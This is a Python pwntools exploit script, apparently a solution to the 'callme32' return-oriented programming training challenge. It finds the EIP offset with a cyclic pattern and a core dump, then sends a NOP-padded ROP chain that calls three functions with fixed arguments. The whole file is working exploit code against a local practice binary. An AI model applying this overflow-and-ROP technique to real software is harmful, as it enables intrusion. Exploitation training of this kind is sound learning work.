#!/usr/bin/python3
from pwn import *

def start():
	binary_path = "./callme32"
	p = process(binary_path)
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

elf = context.binary = ELF("./callme32")
context.log_level = "info"
context.delete_corefiles = True

rop = ROP(elf)
parms = [0xdeadbeef, 0xcafebabe, 0xd00df00d]
rop.callme_one(*parms)
rop.callme_two(*parms)
rop.callme_three(*parms)
rop_chain = rop.chain()

io = start()
payload = cyclic(100)
io.sendlineafter(">", payload)
io.wait()
core = io.corefile

eip = core.eip
eip_offset = cyclic_find(eip)
info("eip offset = %#x", eip_offset)

io = start()
payload = flat(
	asm('nop') * eip_offset,
	rop_chain
)

io.sendlineafter(">", payload)

while 1:
	tmp = io.recv()
	info(tmp)



